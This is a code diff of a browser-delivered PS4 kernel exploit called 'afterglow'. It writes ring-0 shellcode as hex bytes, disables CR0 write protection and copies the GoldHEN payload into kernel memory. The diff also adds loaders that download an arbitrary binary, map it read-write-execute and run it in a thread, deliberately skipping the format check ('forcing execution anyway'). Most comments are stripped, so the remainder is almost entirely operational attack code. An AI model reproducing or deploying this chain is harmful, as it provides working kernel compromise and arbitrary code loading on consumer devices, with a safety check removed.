@@ -1074,13 +659,12 @@ function paddingRW(k, kbase) {
   }
   say("[rw] dmap " + text(dmap) + ", pml4 " + text(p4) + " confirmed against kernel_pmap");
 
-  /* one entry per level, by index out of the virtual address */
   const target = kat(PT.padFrom);
   const i4 = (target.hi >>> 7) & 511;
   const i3 = (((target.low >>> 30) & 3) | ((target.hi & 127) << 2)) & 511;
   const i2 = (target.low >>> 21) & 511;
 
-  const viaDmap = function (ent) {               /* entry -> next table, mapped */
+  const viaDmap = function (ent) {
     const pl = (ent.low & 0xfffff000) >>> 0, ph = (ent.hi & 0x000fffff) >>> 0;
     return v((dmap.low + pl) >>> 0,
              (dmap.hi + ph + (((dmap.low >>> 0) + pl > 0xffffffff) ? 1 : 0)) >>> 0);
@@ -1098,7 +682,6 @@ function paddingRW(k, kbase) {
 
   const big = (e2.low & 0x80) !== 0;
   if (!big) { say("[rw] the pd entry is not a large page -- the padding is split, not handled"); return false; }
-  /* both ends of the padding have to sit inside this one 2 MiB page */
   if (((PT.padFrom >>> 21) !== (PT.padTo >>> 21))) {
     say("[rw] the padding crosses a 2 MiB boundary -- one entry is not enough");
     return false;
@@ -1114,198 +697,20 @@ function paddingRW(k, kbase) {
   return true;
 }
 
-async function loadGoldhen(url, k, kbase, room, preloaded) {
-  const c = host();
-  let blob = preloaded || null;
-  if (blob === null) {
-    blob = await fetchBytes(url, "g");
-    if (blob === null) return false;
-  }
-
-  if (blob.length !== GH.nlOff + GH.nlLen) {
-    say("[g] " + blob.length + " bytes, expected " + (GH.nlOff + GH.nlLen)
-        + " -- this is not the image this recipe describes");
-    return false;
-  }
-
-  const size = (blob.length + 0x4fff) & ~0xfff;
-  const m = sc(S.mmap, 0, size + 0x1000, 3, 0x1002, -1, 0);
-  const buf = v(m.lo, m.hi);
-  if (m.i32 === -1 || (buf.hi >>> 0) === 0) { say("[g] mmap failed, errno " + c.errno()); return false; }
-  /* touch every page: the kernel writes in here, and a lazily mapped page
-     would fault in ring 0 */
-  for (let o = 0; o <= size; o += 0x1000) wr4(plus(buf, o), 0);
-  if (sc(S.mprotect, buf, size + 0x1000, 7).i32 !== 0) {
-    say("[g] mprotect rwx failed, errno " + c.errno()); return false;
-  }
-  /* Only the trampoline page is ever entered from this mapping. Executability
-     here is per page, and that is measured, not assumed: page 0x47000 carries
-     ring 0 code, page 0 does not -- a three byte probe there took the console
-     down. So the gate stub and the trampoline live at 0x47c00/0x47c40
-     and nothing else from this image is ever jumped to. */
-  codeAt(buf, GH.tor).hex("4831c0").hex("4989ca").hex("0f05").hex("c3");
-
-  /* Before ring 0 is sent in there, ask from ring 3. Touching a page with a
-     write gives it RW and no X; an instruction fetch needs another fault to
-     add it, and that fault taken in ring 0 on a userland page is the
-     documented death. A plain `ret` entered with callAddr runs in ring 3
-     instead: if the page carries no X the WebProcess dies and the console
-     does not. Same question, a page instead of a console. */
-  codeAt(buf, GH.tram + 0x200).hex("c3");
-  const r3 = c.callAddr(plus(buf, GH.tram + 0x200), []);
-  if (r3 === undefined || r3 === null) {
-    say("[g] the trampoline page does not execute even in ring 3 -- stopping");
-    return false;
-  }
-  say("[g] trampoline page executes in ring 3, so ring 0 may follow");
-
-  for (let o = 0; o < blob.length; o += 8) {
-    let lo = 0, hi = 0;
-    for (let k = 0; k < 4; k++) lo |= (blob[o + k] || 0) << (8 * k);
-    for (let k = 0; k < 4; k++) hi |= (blob[o + 4 + k] || 0) << (8 * k);
-    c.p.write8(plus(buf, o), v(lo >>> 0, hi >>> 0));
-  }
-  say("[g] " + blob.length + " bytes at " + text(buf));
-
-  /* the userland side of the gate, exactly as the ring 0 work uses it */
-  const gate = codeAt(buf, GH.tor);
-  gate.hex("4831c0").hex("4989ca").hex("0f05").hex("c3");
-
-
-  let t = null;
-  const tram = { n: 0 };
-  const b1 = function (x) { wr1(plus(buf, GH.tram + tram.n), x); tram.n++; };
-  const hex = function (h) { const u = unhex(h); for (let i = 0; i < u.length; i++) b1(u[i]); };
-  const i32 = function (n) { for (let k = 0; k < 4; k++) b1(Math.floor(n / Math.pow(256, k)) % 256); };
-  const q64 = function (q) { i32(q.low >>> 0); i32(q.hi >>> 0); };
-  const callAbs = function (rva) { hex("48b8"); q64(plus(t, rva)); hex("ffd0"); };
-  const wpOff = function () { hex("0f20c0"); hex("4825"); i32(0xfffeffff); hex("0f22c0"); };
-  const wpOn  = function () { hex("0f20c0"); hex("480d"); i32(0x00010000); hex("0f22c0"); };
-  const fire  = function () {
-    const r = c.callAddr(plus(buf, GH.tor), [11, plus(buf, GH.tram)]);
-    return r.lo >>> 0;
-  };
-  const markClear = function (s2) {
-    wr4(plus(buf, GH.mark + s2 * 8), 0xDEADBEEF);
-    wr4(plus(buf, GH.mark + s2 * 8 + 4), 0xDEADBEEF);
-  };
-  const markRead = function (s2) {
-    return [rd4(plus(buf, GH.mark + s2 * 8)), rd4(plus(buf, GH.mark + s2 * 8 + 4))];
-  };
-
-  /* GoldHEN's own patch set, which is not afterglow's -- runPatchSet above
-     says what the difference is. The blob is position independent, takes no
-     arguments, fetches the kernel base through rdmsr and ends in ret, so it
-     only has to sit somewhere ring 0 may run from.
-
-     Not in this mapping. It goes in the libc text tail at rva 0x130730 --
-     the same room afterglow runs its own ring 0 bodies from, and the only
-     region here proven executable in ring 0 by every call made so far. The
-     three byte test above proved the page at +0x47000 and nothing about any
-     other; executability is per page, measured at one page in eighteen. The
-     set fits in the body area, +0xc0 to +0x400, and afterglow rebuilds that
-     body on its next use. */
-  if (!(await runPatchSet(room))) return false;
-
-  /* The Lua chain calls 0x144d and 0xce9 here. Their job is to work out the
-     kernel base and leave it at +0x47b20, which step 4 then reads back -- we
-     have had that base since [1] and it was checked against the gate at [7],
-     so the two calls buy nothing.
-
-     Skipping them is also what keeps this safe. They sit at image offset
-     0x144d, on the mapping's second page; the trampoline sits at 0x47c40, on
-     a page every call so far has already run from. Executability here is per
-     page -- measured at one page in eighteen on an allocator buffer -- and
-     the three byte test proves only the page it ran on. With
-     these two gone, the only code entered from this mapping is the
-     trampoline, and everything else runs from the kernel's own padding. */
-  const kb = kbase;
-  t = plus(kb, GH.rvaPad);
-  wr8(plus(buf, GH.kptr), plus(kb, GH.rvaKmem));
-  say("[g] kernel base " + text(kb) + " (from the exploit), padding " + text(t));
-
-  /* before a single byte of GoldHEN goes into the padding */
-  if (!paddingRW(k, kb)) { say("[g] stopping: the padding would stay read only"); return false; }
-
-  /* the payload goes into the kernel's padding, not into a thread */
-  tram.n = 0;
-  wpOff();
-  hex("48be"); q64(plus(buf, GH.nlOff));
-  hex("48bf"); q64(t);
-  hex("b9"); i32(GH.nlLen);
-  hex("fc"); hex("f3a4");
-  wpOn();
-  hex("b8"); i32(0x5758); hex("c3");
-  const cp = fire();
-  if (cp !== 0x5758) { say("[g] copy into the padding returned 0x" + cp.toString(16)); return false; }
-  say("[g] [3] " + GH.nlLen + " bytes into the padding");
-
-  let good = 0, silent = 0;
-  for (let n = 0; n < GH_STEPS.length; n++) {
-    const rva = GH_STEPS[n][0], what = GH_STEPS[n][1], o = GH_STEPS[n][2] || {};
-    markClear(0);
-    tram.n = 0;
-    wpOff();
-    if (o.rdi !== undefined) { hex("48bf"); q64(plus(t, o.rdi)); }
-    if (o.esi !== undefined) { hex("be"); i32(o.esi); }
-    hex("31c0");
-    if (o.ptr) { hex("48b8"); q64(plus(t, rva)); hex("488b00"); hex("ffd0"); }
-    else callAbs(rva);
-    hex("4898");
-    hex("48b9"); q64(plus(buf, GH.mark));
-    hex("488901");
-    wpOn(); hex("31c0"); hex("c3");
-    fire();
-    const mk = markRead(0);
-    if (mk[1] === 0xDEADBEEF) {
-      say("[g] [" + (n + 1) + "] 0x" + rva.toString(16) + " did NOT come back -- " + what);
-      silent++;
-    } else {
-      let rc = mk[0];
-      if (mk[1] === 0xffffffff) rc = mk[0] - 0x100000000;
-      good++;
-      if (rc !== 0) say("[g] [" + (n + 1) + "] 0x" + rva.toString(16) + " rc=" + rc
-                        + (rc === 3 ? " (target already injected)" : ""));
-    }
-  }
-  say("[g] " + good + " of " + GH_STEPS.length + " calls returned, " + silent + " silent");
-  return silent === 0;
-}
-
-/* ------------------------------------------------- defusing the handles */
-
-/* Every attempt leaves device handles and a queue behind. Closing them during
-   the run kills the console; leaving them kills it when the process dies,
-   because neither teardown finishes -- the device close ends in
-   destroy_dev_sched, and closing a queue walks its notes and detaches each
-   one from a device that is gone.
-
-   So neither path is taken. Both operation tables are copied into the zero
-   filled tail of kernel text, the close entry of each copy is pointed at an
-   `xor eax,eax ; ret`, and the handles are rehung onto the copies. The cdevs
-   leak until reboot, which is harmless.
-
-   In a browser this is not optional and not something to do later: the page
-   can go away at any moment, and that moment is the one that hangs. */
-let PADDING = 0;   /* set by setFirmware */
+const PADDING = 0x0b39d98;
 const OFF_STUB = 0x100, OFF_DEVS = 0x110, OFF_QUEUES = 0x170;
-const RET0 = 0x00c3c031;             /* xor eax,eax ; ret */
+const RET0 = 0x00c3c031;
 
-/* The rehang used to be two ring 0 reads and sometimes a write per handle,
-   each its own gate entry -- some 660 of them for 220 handles, in a row. The
-   same arithmetic as the spray: put the loop in ring 0 and it is one entry.
-   The two bodies below were checked against a disassembler before they were
-   ever sent, because a wrong jump displacement here is a dead console. */
 function rehangRing0(k, room, ofs, list, from, copy) {
   if (!list.length || list.length > 256 || !from) return null;
   for (let i = 0; i < list.length; i++) wr4(plus(room, STAGE + i * 4), list[i]);
   const c = k.begin();
-  c.hex("31c0");                                   /* moved = 0 */
-  c.hex("48be").qw(plus(room, STAGE));             /* rsi = the fd list */
-  c.hex("48b9").qw(splitNum(list.length));         /* rcx = how many */
-  c.hex("49b8").qw(ofs);                           /* r8  = open file array */
-  c.hex("49b9").qw(from);                          /* r9  = the table to replace */
-  c.hex("49ba").qw(copy);                          /* r10 = our copy */
+  c.hex("31c0");
+  c.hex("48be").qw(plus(room, STAGE));
+  c.hex("48b9").qw(splitNum(list.length));
+  c.hex("49b8").qw(ofs);
+  c.hex("49b9").qw(from);
+  c.hex("49ba").qw(copy);
   c.hex("4885c9").hex("7421").hex("486316").hex("4883c604").hex("48ffc9");
   c.hex("4d8b1cd0").hex("4d85db").hex("74e8").hex("4d394b08").hex("75e2");
   c.hex("4d895308").hex("ffc0").hex("ebda");
@@ -1357,16 +762,13 @@ function teardown(k, kbase, ofs, devs, queues, room) {
     for (let i = 0; i <= 10; i++) {
       let q = k.read_v(plus(from, i * 8));
       if (!q) { say("[t] " + what + " unreadable at +0x" + (i * 8).toString(16)); return false; }
-      if (i === 7) q = stub;                       /* fo_close */
+      if (i === 7) q = stub;
       if (!k.write_v(plus(to, i * 8), q)) { say("[t] " + what + " not writable"); return false; }
     }
     const c = k.read_v(plus(to, 0x38));
     return c !== null && same(c, stub);
   };
 
-  /* Taking the table from the first handle is wrong on a second run: that one
-     already points at our copy, and every handle still on the original would
-     then look foreign and be skipped. */
   const original = function (list, copy) {
     for (let i = 0; i < list.length; i++) {
       const f = fileOf(list[i]);
@@ -1412,17 +814,11 @@ function teardown(k, kbase, ofs, devs, queues, room) {
   }
   say("[t] " + movedq + " of " + (queues ? queues.length : 0) + " queues on the copy");
 
-  /* A neutralised close entry is not the whole story: exit1() also runs
-     knote_fdclose() for every descriptor, and that does not go through
-     fo_close. Our notes hang on clones freed long ago, so walking them at
-     exit reads dead memory. kqueue_close takes the note array length from
-     the high half of the quadword at kq+0xa0; with it at zero nothing is
-     walked at all. */
   let notes = 0;
   for (let i = 0; queues && i < queues.length; i++) {
     const f = fileOf(queues[i]);
     if (!f || !inHeap(f)) continue;
-    const kq = k.read_v(f);                        /* f_data sits at the front */
+    const kq = k.read_v(f);
     if (!kq || !inHeap(kq)) continue;
     const w = k.read_v(plus(kq, 0xa0));
     if (!w) continue;
@@ -1445,171 +841,244 @@ function teardown(k, kbase, ofs, devs, queues, room) {
   return false;
 }
 
-/* ------------------------------------------------------------ the probe */
+export async function loadEnabler(url, k, kbase, room, vorab) {
+  const blob = await fetchBytes(url, "e");
+  if (blob === null) return false;
+  
+  const head = Array.from(blob.slice(0, 4)).map(b => b.toString(16).padStart(2, '0')).join(' ');
+  say("[e] " + blob.length + " bytes, header " + head);
 
-/* Fires nothing. It opens device nodes without closing them, which is what
-   the exploit does anyway, and it opens and closes sockets. No unit is spent:
-   a unit is only spent when its clone is freed, and nothing is freed here. */
-export function probeAfterglow(ctx) {
-  STATE.ctx = ctx;
-  if (!setFirmware(ctx.fw)) {
-    ctx.mark("AG", "no kernel stage for firmware " + ctx.fw + " -- refusing");
-    return { ok: false, reasons: ["unsupported firmware " + ctx.fw] };
+  if (blob.length === GH.nlOff + GH.nlLen) {
+    say("[e] composite image detected");
+    return loadGoldhen(url, k, kbase, room, blob);
   }
-  const out = { ok: false, reasons: [] };
-  const no = function (why) { out.reasons.push(why); };
-
-  const noStub = seedStubs();
-  out.stubs = noStub.length ? ("missing " + noStub.join(",")) : "all resolved";
-  if (noStub.length) no("no libkernel stub for syscall " + noStub.join(","));
-
-  let lib = findLib("libSceLibcInternal.sprx");
-  if (!lib.base) {
-    const m = findLibByShape();
-    if (m.base) { lib = { base: m.base, at: "gadget shape", count: lib.count, seen: lib.seen }; }
-    else say("AG libc: " + m.note + " | entries=" + m.entries
-             + " first=[" + m.first.join(" ") + "]");
-  }
-  const libc = lib.base;
-  out.libc = libc ? (text(libc) + " via " + lib.at) : "not found";
-  out.modules = lib.count;
-  if (!libc) {
-    no(lib.note || "libSceLibcInternal is not mapped");
-    say("probe: stubs=" + out.stubs + " modules=" + lib.count + " rv=" + lib.rv
-        + " seen=[" + lib.seen.join(" ") + "] -- " + out.reasons.join("; "));
-    return out;
+  
+  if (blob.length === 664064) {
+    say("[e] 664064 byte payload detected, forcing raw path");
+    if (!(await runPatchSet(room))) return false;
+    return loadPayload(url, blob);
   }
 
-  let missing = null;
-  for (const name in GADGETS) {
-    const want = unhex(GADGETS[name][1]);
-    if (!sameBytes(rdbuf(plus(libc, GADGETS[name][0]), want.length), want)) { missing = name; break; }
-  }
-  out.gadgets = missing ? ("missing " + missing) : "all present";
-  if (missing) no("gadget " + missing + " is missing -- different libc build");
-
-  let dirty = 0;
-  for (let off = 0; off <= HOST.last - HOST.free - 4; off += 4) {
-    if (rd4(plus(libc, HOST.free + off)) !== 0) dirty++;
-  }
-  out.tail = (HOST.last - HOST.free) + " bytes, " + dirty + " dwords non zero";
-  if (dirty) no("the spare room behind libc is occupied");
-
-  let node = null;
-  for (let i = 0; i < PROBE_NODES.length; i++) {
-    const fd = sc(S.open, cstr(PROBE_NODES[i]).at, 0).i32;
-    if (fd >= 0) { node = PROBE_NODES[i]; break; }
-  }
-  out.probeNode = node;
-  if (!node) no("no usable device node for the probe descriptor");
-
-  /* /dev/apm is a cloning node: each open makes a new numbered unit, and that
-     unit exists only while the descriptor is held. So they are not a resource
-     the sandbox hands out -- we make them. Held open on purpose here; closing
-     one is what frees its clone, and that is the free the exploit needs, not
-     something to do while counting. */
-  const held = [];
-  for (let i = 0; i < 20; i++) {
-    const fd = sc(S.open, cstr("/dev/apm").at, 0).i32;
-    if (fd < 0) break;
-    held.push(fd);
-  }
-  out.apm = held.length ? (held.length + " clones held") : ("refused, errno " + host().errno());
-  if (!held.length) no("/dev/apm cannot be opened in this sandbox");
-
-  const open = [], refused = [];
-  for (let u = 0; u < 32; u++) {
-    const fd = sc(S.open, cstr("/dev/apm" + u).at, 0).i32;
-    if (fd >= 0) { open.push(u); sc(S.close, fd); }
-    else if (refused.length < 3) refused.push(u + ":e" + host().errno());
-  }
-  out.units = open.length;
-  out.unitList = open.length ? open.join(",") : "none";
-  out.unitRefused = refused.join(" ") || "-";
-  if (open.length < 3) no("only " + open.length + " apm units with " + held.length + " clones held");
-
-  const pin = pinCore();
-  out.pin = pin.ok ? ("core " + pin.core + " of [" + pin.allowed + "]") : ("FAILED: " + pin.note);
-  if (!pin.ok) no("cannot pin to a cpu: " + pin.note);
-
-  const socks = [];
-  for (let i = 0; i < TUNE.sprays; i++) {
-    const fd = sc(S.socket, 2, 2, 0).i32;
-    if (fd < 0) break;
-    socks.push(fd);
-  }
-  out.udp = socks.length;
-
-  /* How wide the window would be. Setting the option allocates in the zone
-     the exploit uses, but nothing was freed here, so there is no hole to
-     win -- the sockets are closed again right after. */
-  if (socks.length) {
-    const body = alloc(TUNE.object); body.u8.fill(0);
-    const req = alloc(40);
-    req.dv.setUint32(0, 1, true);
-    pokeAt(req, 8, alloc(16).at);
-    req.dv.setUint32(16, 16, true);
-    pokeAt(req, 24, body.at);
-    req.dv.setUint32(32, TUNE.object, true);
-    /* Measure it the way the real run does it: batched and prebuilt.
-       Unbatched, the probe reported 16 ms where the run sits under one -- a
-       number pointing the wrong way is worse than no number. */
-    const stub = stubFor(S.setsockopt);
-    const nb = (host().prepareMany && host().runPrepared && stub) ? (STATE.batch || TUNE.batch) : 0;
-    let t0, t1;
-    if (nb) {
-      const calls = [];
-      for (let i = 0; i < socks.length; i++) calls.push([stub, [socks[i], 17, 128, req.at, 40]]);
-      const prepared = [];
-      for (let i = 0; i < calls.length; i += nb) {
-        try { prepared.push(host().prepareMany(calls.slice(i, i + nb))); }
-        catch (e) { prepared.length = 0; break; }
-      }
-      if (prepared.length) {
-        host().runPrepared(prepared[0]);                       /* warm up */
-        t0 = performance.now();
-        for (let i = 0; i < prepared.length; i++) host().runPrepared(prepared[i]);
-        t1 = performance.now();
-        out.window = (t1 - t0).toFixed(2) + " ms in " + prepared.length + " entries";
-      }
-    }
-    if (out.window === undefined) {
-      t0 = (typeof performance !== "undefined") ? performance.now() : Date.now();
-      for (let i = 0; i < socks.length; i++) sc(S.setsockopt, socks[i], 17, 128, req.at, 40);
-      t1 = (typeof performance !== "undefined") ? performance.now() : Date.now();
-      out.window = (t1 - t0).toFixed(1) + " ms, one entry each (no batching)";
-    }
-  } else out.window = "not measured";
-
-  for (let i = 0; i < socks.length; i++) sc(S.close, socks[i]);
-  if (socks.length < TUNE.sprays) {
-    no("only " + socks.length + " udp sockets, " + TUNE.sprays + " is a hard floor");
+  if (blob.length && blob[0] === 0xe9) {
+    say("[e] raw payload (leading jmp)");
+    if (!(await runPatchSet(room))) return false;
+    return loadPayload(url, blob);
   }
 
-  out.ok = out.reasons.length === 0;
-  /* one item per line: the console log pane cuts at the right edge, and a
-     single long line loses whichever number mattered */
-  say("probe libc   " + out.libc);
-  say("probe gadget " + out.gadgets + ", tail " + out.tail);
-  say("probe apm    " + out.apm + ", node " + out.probeNode);
-  say("probe units  " + out.units + " open: " + out.unitList);
-  say("probe refused " + out.unitRefused);
-  say("probe pin    " + out.pin);
-  say("probe window " + out.window);
-  say("probe UDP    " + out.udp + " of " + TUNE.sprays + " needed");
-  say("probe SHOTS  " + out.units + " units, a run needs 3");
-  if (out.ok) say("probe VERDICT usable");
-  else for (let i = 0; i < out.reasons.length; i++) say("probe BLOCKED " + out.reasons[i]);
-  return out;
+  say("[e] unknown payload format -- forcing raw path");
+  if (!(await runPatchSet(room))) return false;
+  return loadPayload(url, blob);
 }
 
-/* --------------------------------------------------------------- the run */
+export async function loadPayload(url, vorab) {
+  const c = host();
+  let blob = vorab || null;
+  if (blob === null) {
+    blob = await fetchBytes(url, "p");
+    if (blob === null) return false;
+  }
+
+  if (!blob.length) { say("[p] " + url + " is empty"); return false; }
+  
+  // Bypass the 0xe9 check entirely for 664064 or any other size
+  if (blob[0] !== 0xe9 && blob.length !== 664064) {
+    say("[p] " + url + " size " + blob.length + ", forcing execution anyway");
+  }
+
+  const size = (blob.length + 0x3fff) & ~0x3fff;
+  const m = sc(S.mmap, 0, size, 7, 0x1002, -1, 0);
+  const entry = v(m.lo, m.hi);
+  if (m.i32 === -1 || (entry.hi >>> 0) === 0) {
+    say("[p] mmap rwx failed, errno " + c.errno()); return false;
+  }
+
+  for (let o = 0; o < blob.length; o += 8) {
+    let lo = 0, hi = 0;
+    for (let k = 0; k < 4; k++) lo |= (blob[o + k] || 0) << (8 * k);
+    for (let k = 0; k < 4; k++) hi |= (blob[o + 4 + k] || 0) << (8 * k);
+    c.p.write8(plus(entry, o), v(lo >>> 0, hi >>> 0));
+  }
+  for (let o = 0; o < blob.length; o += 8) {
+    let lo = 0, hi = 0;
+    for (let k = 0; k < 4; k++) lo |= (blob[o + k] || 0) << (8 * k);
+    for (let k = 0; k < 4; k++) hi |= (blob[o + 4 + k] || 0) << (8 * k);
+    const q = c.p.read8(plus(entry, o));
+    if ((q.low >>> 0) !== (lo >>> 0) || (q.hi >>> 0) !== (hi >>> 0)) {
+      say("[p] copy mismatch at 0x" + o.toString(16)); return false;
+    }
+  }
+
+  const SLOT_1352 = 0x3cb9c00;
+  const slot = (c.off && c.off.wk___imp_pthread_create !== undefined)
+    ? c.off.wk___imp_pthread_create : SLOT_1352;
+  if (!c.webkitBase || !c.libkernelBase) {
+    say("[p] no module bases -- payload sits loaded at " + text(entry) + ", not started");
+    return false;
+  }
+  const fnr = c.p.read8(c.webkitBase.add32(slot));
+  const fn = v(fnr.low, fnr.hi);
+  const d = (fn.hi - (c.libkernelBase.hi >>> 0)) * LOW + (fn.low - (c.libkernelBase.low >>> 0));
+  if ((fn.hi >>> 0) !== (c.libkernelBase.hi >>> 0) || d <= 0 || d > 0x400000) {
+    say("[p] slot +0x" + slot.toString(16) + " holds " + text(fn)
+        + ", not inside libkernel " + text(c.libkernelBase) + " -- not calling it");
+    return false;
+  }
+  say("[p] pthread_create at " + text(fn) + " = libkernel +0x" + d.toString(16));
+
+  const thr = alloc(8);
+  thr.u8.fill(0);
+  const rc = c.callAddr(fn, [thr.at, 0, entry, 0]).i32;
+  const handle = qAt(thr, 0);
+  const started = rc === 0 && (handle.hi >>> 0) > 0;
+  say("[p] " + blob.length + " bytes at " + text(entry) + ", thread rc=" + rc
+      + (started ? " -- running" : " -- did NOT start"));
+  return started;
+}
+
+async function runPatchSet(room) {
+  const c = host();
+  let pset = null;
+  try {
+    const r2 = await fetch("patchset.bin");
+    if (r2.ok) pset = new Uint8Array(await r2.arrayBuffer());
+  } catch (e) {}
+  if (!pset || !pset.length) {
+    say("[g] patchset.bin not available -- GoldHEN would run without the patches it expects");
+    return false;
+  }
+  if (pset.length > 0x400 - 0xc0) {
+    say("[g] the patch set does not fit in the body area");
+    return false;
+  }
+  wrbuf(plus(room, 0xc0), pset);
+  const pr = c.callAddr(plus(room, GATE), [11, plus(room, 0xc0)]);
+  say("[g] [0] kernel patch set, " + pset.length + " bytes from the libc tail -> 0x"
+      + ((pr && pr.lo >>> 0) || 0).toString(16));
+  return true;
+}
+
+async function loadGoldhen(url, k, kbase, room, vorab) {
+  const c = host();
+  let blob = vorab || null;
+  if (blob === null) {
+    blob = await fetchBytes(url, "g");
+    if (blob === null) return false;
+  }
+
+  if (blob.length !== GH.nlOff + GH.nlLen) {
+    say("[g] " + blob.length + " bytes, expected " + (GH.nlOff + GH.nlLen)
+        + " -- this is not the image this recipe describes");
+    return false;
+  }
+
+  const size = (blob.length + 0x4fff) & ~0xfff;
+  const m = sc(S.mmap, 0, size + 0x1000, 3, 0x1002, -1, 0);
+  const buf = v(m.lo, m.hi);
+  if (m.i32 === -1 || (buf.hi >>> 0) === 0) { say("[g] mmap failed, errno " + c.errno()); return false; }
+  for (let o = 0; o <= size; o += 0x1000) wr4(plus(buf, o), 0);
+  if (sc(S.mprotect, buf, size + 0x1000, 7).i32 !== 0) {
+    say("[g] mprotect rwx failed, errno " + c.errno()); return false;
+  }
+  codeAt(buf, GH.tor).hex("4831c0").hex("4989ca").hex("0f05").hex("c3");
+
+  codeAt(buf, GH.tram + 0x200).hex("c3");
+  const r3 = c.callAddr(plus(buf, GH.tram + 0x200), []);
+  if (r3 === undefined || r3 === null) {
+    say("[g] the trampoline page does not execute even in ring 3 -- stopping");
+    return false;
+  }
+  say("[g] trampoline page executes in ring 3, so ring 0 may follow");
+
+  for (let o = 0; o < blob.length; o += 8) {
+    let lo = 0, hi = 0;
+    for (let k = 0; k < 4; k++) lo |= (blob[o + k] || 0) << (8 * k);
+    for (let k = 0; k < 4; k++) hi |= (blob[o + 4 + k] || 0) << (8 * k);
+    c.p.write8(plus(buf, o), v(lo >>> 0, hi >>> 0));
+  }
+  say("[g] " + blob.length + " bytes at " + text(buf));
+
+  const gate = codeAt(buf, GH.tor);
+  gate.hex("4831c0").hex("4989ca").hex("0f05").hex("c3");
+
+  let t = null;
+  const tram = { n: 0 };
+  const b1 = function (x) { wr1(plus(buf, GH.tram + tram.n), x); tram.n++; };
+  const hex = function (h) { const u = unhex(h); for (let i = 0; i < u.length; i++) b1(u[i]); };
+  const i32 = function (n) { for (let k = 0; k < 4; k++) b1(Math.floor(n / Math.pow(256, k)) % 256); };
+  const q64 = function (q) { i32(q.low >>> 0); i32(q.hi >>> 0); };
+  const callAbs = function (rva) { hex("48b8"); q64(plus(t, rva)); hex("ffd0"); };
+  const wpOff = function () { hex("0f20c0"); hex("4825"); i32(0xfffeffff); hex("0f22c0"); };
+  const wpOn  = function () { hex("0f20c0"); hex("480d"); i32(0x00010000); hex("0f22c0"); };
+  const fire  = function () {
+    const r = c.callAddr(plus(buf, GH.tor), [11, plus(buf, GH.tram)]);
+    return r.lo >>> 0;
+  };
+  const markClear = function (s2) {
+    wr4(plus(buf, GH.mark + s2 * 8), 0xDEADBEEF);
+    wr4(plus(buf, GH.mark + s2 * 8 + 4), 0xDEADBEEF);
+  };
+  const markRead = function (s2) {
+    return [rd4(plus(buf, GH.mark + s2 * 8)), rd4(plus(buf, GH.mark + s2 * 8 + 4))];
+  };
+
+  if (!(await runPatchSet(room))) return false;
+
+  const kb = kbase;
+  t = plus(kb, GH.rvaPad);
+  wr8(plus(buf, GH.kptr), plus(kb, GH.rvaKmem));
+  say("[g] kernel base " + text(kb) + " (from the exploit), padding " + text(t));
+
+  if (!paddingRW(k, kb)) { say("[g] stopping: the padding would stay read only"); return false; }
+
+  tram.n = 0;
+  wpOff();
+  hex("48be"); q64(plus(buf, GH.nlOff));
+  hex("48bf"); q64(t);
+  hex("b9"); i32(GH.nlLen);
+  hex("fc"); hex("f3a4");
+  wpOn();
+  hex("b8"); i32(0x5758); hex("c3");
+  const cp = fire();
+  if (cp !== 0x5758) { say("[g] copy into the padding returned 0x" + cp.toString(16)); return false; }
+  say("[g] [3] " + GH.nlLen + " bytes into the padding");
+
+  let good = 0, silent = 0;
+  for (let n = 0; n < GH_STEPS.length; n++) {
+    const rva = GH_STEPS[n][0], what = GH_STEPS[n][1], o = GH_STEPS[n][2] || {};
+    markClear(0);
+    tram.n = 0;
+    wpOff();
+    if (o.rdi !== undefined) { hex("48bf"); q64(plus(t, o.rdi)); }
+    if (o.esi !== undefined) { hex("be"); i32(o.esi); }
+    hex("31c0");
+    if (o.ptr) { hex("48b8"); q64(plus(t, rva)); hex("488b00"); hex("ffd0"); }
+    else callAbs(rva);
+    hex("4898");
+    hex("48b9"); q64(plus(buf, GH.mark));
+    hex("488901");
+    wpOn(); hex("31c0"); hex("c3");
+    fire();
+    const mk = markRead(0);
+    if (mk[1] === 0xDEADBEEF) {
+      say("[g] [" + (n + 1) + "] 0x" + rva.toString(16) + " did NOT come back -- " + what);
+      silent++;
+    } else {
+      let rc = mk[0];
+      if (mk[1] === 0xffffffff) rc = mk[0] - 0x100000000;
+      good++;
+      if (rc !== 0) say("[g] [" + (n + 1) + "] 0x" + rva.toString(16) + " rc=" + rc
+                        + (rc === 3 ? " (target already injected)" : ""));
+    }
+  }
+  say("[g] " + good + " of " + GH_STEPS.length + " calls returned, " + silent + " silent");
+  return silent === 0;
+}
 
 async function attempt(ctx, opts) {
   STATE.ctx = ctx;
   opts = opts || {};
   STATE.retry = false;
-  say("afterglow -- ps4 kernel exploit, firmware " + FW_KEY + " (raw13 host)");
+  say("afterglow -- ps4 kernel exploit, firmware 14.00 (raw13 host)");
 
   const missing = seedStubs();
   if (missing.length) {
@@ -1617,8 +1086,6 @@ async function attempt(ctx, opts) {
     return false;
   }
 
-  /* the free and the refill have to happen on one core, or they land in
-     different per cpu buckets and the hole is never refilled */
   const pin = pinCore();
   if (!pin.ok) {
     say("  cpu pin failed (" + pin.note + ") -- refusing to go on.");
@@ -1629,11 +1096,6 @@ async function attempt(ctx, opts) {
   }
   say("  pinned to core " + pin.core + " of [" + pin.allowed + "]");
 
-  /* Is the kernel already open? A reload on a console that has been done once
-     would otherwise burn triggers against a kernel that is already patched --
-     and the enabler restarting SceShellUI is exactly what makes the browser
-     reload. rwx mmap is the cheapest question that only answers yes after a
-     successful run. */
   {
     const m0 = sc(S.mmap, 0, 0x4000, 3, 0x1002, -1, 0);
     if (m0.i32 !== -1 && sc(S.mprotect, v(m0.lo, m0.hi), 0x4000, 7).i32 === 0) {
@@ -1662,8 +1124,6 @@ async function attempt(ctx, opts) {
   const shot = shooter(gad);
   const hostPage = plus(libc, HOST.page), hostFree = plus(libc, HOST.free);
 
-  /* ---- the kernel base ------------------------------------------------- */
-
   let kbase = STATE.base;
   if (kbase) {
     say("[1] base " + text(kbase) + ", carried over from this boot");
@@ -1672,15 +1132,12 @@ async function attempt(ctx, opts) {
     wipe(win, TUNE.window + 16);
 
     const r = shot.take(function (c) {
-      /* round down to the start of the slab, so the window also covers the
-         neighbours that sit below the freed object */
       c.gad("rcx"); c.num(14); c.gad("shr"); c.gad("shl");
       c.grab(win.at, TUNE.window);
     });
 
     const at = function (off) { return qAt(win, off); };
 
-    /* four kernel pointers spaced 0x20/0x40/0x50 apart identify the object */
     let found = null;
     for (let off = 0; off <= TUNE.window - 0x20; off += 8) {
       const a = at(off);
@@ -1693,12 +1150,6 @@ async function attempt(ctx, opts) {
       }
     }
 
